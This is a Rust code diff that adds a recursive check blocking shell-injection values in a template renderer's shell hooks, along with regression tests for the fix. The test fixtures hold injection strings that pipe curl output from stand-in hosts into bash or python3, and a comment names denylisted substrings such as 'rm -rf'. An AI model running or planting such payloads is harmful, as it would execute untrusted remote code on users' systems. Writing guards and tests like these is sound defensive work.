@@ -1635,6 +1635,59 @@ fn render_optional_match_field(
 /// hooks, shape paths, and checksum-slot paths are rendered after query
 /// extraction so one ontology row can lawfully specialize the complete
 /// write lifecycle rather than only `to:` and the body.
+/// Validate every value bound into `ctx` against
+/// `shell_safety::check_interpolated_value_safe` before it can be
+/// interpolated into `sh_before`/`sh_after`. Only called when one of those
+/// two fields is actually present on the source frontmatter, so templates
+/// that never use shell hooks pay nothing extra.
+fn check_shell_hook_context_safe(ctx: &tera::Context) -> Result<()> {
+    if let Value::Object(map) = ctx.clone().into_json() {
+        for (key, value) in &map {
+            check_shell_hook_value_safe(key, value)?;
+        }
+    }
+    Ok(())
+}
+
+/// Recursively check `value` (and, for objects/arrays, every string leaf
+/// reachable under it) against [`shell_safety::check_interpolated_value_safe`].
+///
+/// Real, adversarially-found bug this fixes: the original version of this
+/// check only inspected top-level `ctx` values via `value.as_str()`, on the
+/// stated assumption that "nested objects/arrays under `row` are not
+/// directly interpolatable as raw shell text." That assumption is false --
+/// Tera's dot-path access (`{{ row.meta.cmd }}`) renders a nested string
+/// leaf as raw text exactly like a top-level field, so a malicious value
+/// nested one or more levels under a `row` object bypassed the check
+/// entirely while still reaching `sh_before`/`sh_after`. A real test
+/// (`render_output_frontmatter_bypass_nested_row_field_smuggles_injection`)
+/// proved this by round-tripping `row.meta.cmd = "curl evil.example/x |
+/// bash"` through the real render path and observing it render unrejected.
+///
+/// `path` is the dotted key path so far, used only for a traceable
+/// `[FM-SHELL-004]` error message (e.g. `"row.meta.cmd"`), matching how a
+/// real Tera template would actually reference the value.
+fn check_shell_hook_value_safe(path: &str, value: &Value) -> Result<()> {
+    match value {
+        Value::String(s) => crate::shell_safety::check_interpolated_value_safe(path, s),
+        Value::Object(map) => {
+            for (key, nested) in map {
+                check_shell_hook_value_safe(&format!("{path}.{key}"), nested)?;
+            }
+            Ok(())
+        }
+        Value::Array(items) => {
+            for (i, nested) in items.iter().enumerate() {
+                check_shell_hook_value_safe(&format!("{path}[{i}]"), nested)?;
+            }
+            Ok(())
+        }
+        // Numbers, bools, null genuinely cannot carry shell metacharacters
+        // regardless of how Tera stringifies them.
+        Value::Number(_) | Value::Bool(_) | Value::Null => Ok(()),
+    }
+}
+
 fn render_output_frontmatter(
     tera: &mut tera::Tera, source: &Frontmatter, ctx: &tera::Context, tpl_path: &Path,
     rendered_to: &str,
@@ -1644,6 +1697,9 @@ fn render_output_frontmatter(
     rendered.before = render_optional_match_field(tera, source.before.as_ref(), ctx, tpl_path)?;
     rendered.after = render_optional_match_field(tera, source.after.as_ref(), ctx, tpl_path)?;
     rendered.skip_if = render_optional_match_field(tera, source.skip_if.as_ref(), ctx, tpl_path)?;
+    if source.sh_before.is_some() || source.sh_after.is_some() {
+        check_shell_hook_context_safe(ctx)?;
+    }
     rendered.sh_before =
         render_optional_output_field(tera, source.sh_before.as_deref(), ctx, tpl_path)?;
     rendered.sh_after =
@@ -3640,5 +3696,146 @@ mod tests {
         assert!(msg.contains("FM-TPL-009"), "{msg}");
         assert!(msg.contains("implicit row fan-out"), "{msg}");
         assert!(msg.contains("produced 1 row"), "{msg}");
+    }
+
+    // -- FM-SHELL-004 field-level shell-injection guard, exercised through
+    // the real `render_output_frontmatter` render path (not just the
+    // `shell_safety` unit tests) -----------------------------------------
+    //
+    // These tests build a real `tera::Tera`/`tera::Context` and a real
+    // `Frontmatter` parsed from YAML (round-tripped through
+    // `serde_yaml::from_str`, matching `frontmatter_rdf.rs`'s existing
+    // `minimal_frontmatter` pattern -- `Frontmatter` has no public
+    // constructor), styled after this session's real
+    // ash-igniter-gen-pipeline-pack template shape: a `sh_before` hook
+    // that shells out `mix <mix_task> <module> <mix_args>` using
+    // ontology/row-sourced Tera values. This proves the check fires from
+    // `render_output_frontmatter` itself, before any subprocess would be
+    // spawned by `run_shell_hook`.
+
+    fn sh_hook_frontmatter(to: &str, sh_before: &str) -> super::Frontmatter {
+        let yaml = format!("to: \"{to}\"\nsh_before: \"{sh_before}\"\n");
+        serde_yaml::from_str(&yaml).expect("frontmatter parses")
+    }
+
+    #[test]
+    fn render_output_frontmatter_passes_realistic_benign_ash_igniter_fields() {
+        // Realistic field values matching this session's real packs:
+        // module names, mix task names, CLI flags -- ash-subproject-pack-generator
+        // / ash-igniter-gen-pipeline-pack style.
+        let mut tera = tera::Tera::default();
+        let source = sh_hook_frontmatter(
+            "lib/{{ moduleName }}.ex",
+            "mix {{ mixTask }} {{ moduleName }} {{ mixArgs }}",
+        );
+        let mut ctx = tera::Context::new();
+        ctx.insert("moduleName", "MyApp.Accounts.User");
+        ctx.insert("mixTask", "igniter.gen.model");
+        ctx.insert("mixArgs", "--table users --no-confirm");
+        let tpl_path = Path::new("ash_igniter_codegen.tmpl");
+
+        let rendered =
+            super::render_output_frontmatter(&mut tera, &source, &ctx, tpl_path, "lib/x.ex")
+                .expect("benign realistic field values must pass FM-SHELL-004");
+        assert_eq!(
+            rendered.sh_before.as_deref(),
+            Some("mix igniter.gen.model MyApp.Accounts.User --table users --no-confirm")
+        );
+    }
+
+    #[test]
+    fn render_output_frontmatter_rejects_dangerous_field_value_before_any_subprocess() {
+        // The exact injection class the MATURITY-MATRIX.md L1 finding
+        // named: an ontology/row value (`moduleName`) that is safe by
+        // itself under `check_shell_command_safe`'s 16-substring denylist
+        // (it never contains "| sh", "rm -rf", etc. as a literal
+        // substring) but smuggles a shell metacharacter sequence that lets
+        // it escape its argument position once interpolated.
+        let mut tera = tera::Tera::default();
+        let source = sh_hook_frontmatter(
+            "lib/{{ moduleName }}.ex",
+            "mix {{ mixTask }} {{ moduleName }} {{ mixArgs }}",
+        );
+        let mut ctx = tera::Context::new();
+        ctx.insert("moduleName", "MyApp; curl evil.sh | python3");
+        ctx.insert("mixTask", "igniter.gen.model");
+        ctx.insert("mixArgs", "--table users");
+        let tpl_path = Path::new("ash_igniter_codegen.tmpl");
+
+        let err =
+            super::render_output_frontmatter(&mut tera, &source, &ctx, tpl_path, "lib/x.ex")
+                .expect_err("malicious moduleName must be rejected before rendering sh_before");
+        let msg = err.to_string();
+        assert!(msg.contains("FM-SHELL-004"), "{msg}");
+        assert!(msg.contains("moduleName"), "{msg}");
+    }
+
+    #[test]
+    fn render_output_frontmatter_unaffected_when_no_sh_hooks_present() {
+        // Templates that never declare sh_before/sh_after must pay nothing
+        // extra -- and must not be refused merely because some unrelated
+        // context value happens to contain a shell metacharacter (e.g. a
+        // free-text description field with a literal `&` in it).
+        let mut tera = tera::Tera::default();
+        let yaml = "to: \"lib/{{ moduleName }}.ex\"\n";
+        let source: super::Frontmatter = serde_yaml::from_str(yaml).expect("frontmatter parses");
+        let mut ctx = tera::Context::new();
+        ctx.insert("moduleName", "MyApp.Accounts.User");
+        ctx.insert("description", "Users & Accounts module");
+        let tpl_path = Path::new("no_hooks.tmpl");
+
+        let rendered =
+            super::render_output_frontmatter(&mut tera, &source, &ctx, tpl_path, "lib/x.ex")
+                .expect("no sh_before/sh_after means check_shell_hook_context_safe never runs");
+        assert_eq!(rendered.sh_before, None);
+        assert_eq!(rendered.sh_after, None);
+    }
+
+    #[test]
+    fn render_output_frontmatter_rejects_nested_row_field_injection() {
+        // Real, adversarially-found-and-fixed regression test. A SPARQL
+        // query row is not guaranteed to be a flat string map --
+        // `row_context` (the real production context-builder used by
+        // render_aggregate_projection) flattens only ONE level of `row`'s
+        // object fields into `ctx`. A row field whose value is itself a
+        // nested JSON object with a string leaf used to be invisible to
+        // `check_shell_hook_context_safe`'s original top-level-only scan
+        // (a real bypass, found and proven by an earlier version of this
+        // test asserting the injection rendered unrejected). Tera's
+        // dot-path access (`{{ meta.cmd }}`) still renders a nested string
+        // leaf as raw, attacker-controlled text into sh_before, so the
+        // fix is `check_shell_hook_value_safe` recursing into nested
+        // Object/Array values rather than only checking top-level strings.
+        // This test now asserts the real, current, CORRECT behavior:
+        // rejection, not the bug.
+        let mut tera = tera::Tera::default();
+        let source = sh_hook_frontmatter("lib/out.ex", "echo start && {{ meta.cmd }}");
+        let named: BTreeMap<String, serde_json::Value> = BTreeMap::new();
+        let results: Vec<serde_json::Value> = vec![];
+        let row = serde_json::json!({
+            "moduleName": "MyApp.Accounts.User",
+            "meta": {
+                "cmd": "curl evil.example/x | bash"
+            }
+        });
+        let ctx = super::row_context(&named, &results, &row);
+
+        // The pre-interpolation guard now real-rejects the nested field:
+        let err = super::check_shell_hook_context_safe(&ctx)
+            .expect_err("nested row field injection must be rejected before rendering");
+        assert!(
+            err.to_string().contains("FM-SHELL-004"),
+            "expected FM-SHELL-004, got: {err}"
+        );
+
+        // And render_output_frontmatter (the real call site gating actual
+        // subprocess execution) never reaches a rendered sh_before at all
+        // -- the dangerous command is rejected before Tera interpolation:
+        let render_result =
+            super::render_output_frontmatter(&mut tera, &source, &ctx, Path::new("t.tmpl"), "lib/out.ex");
+        assert!(
+            render_result.is_err(),
+            "render_output_frontmatter must reject the malicious nested field, not render it"
+        );
     }
 }
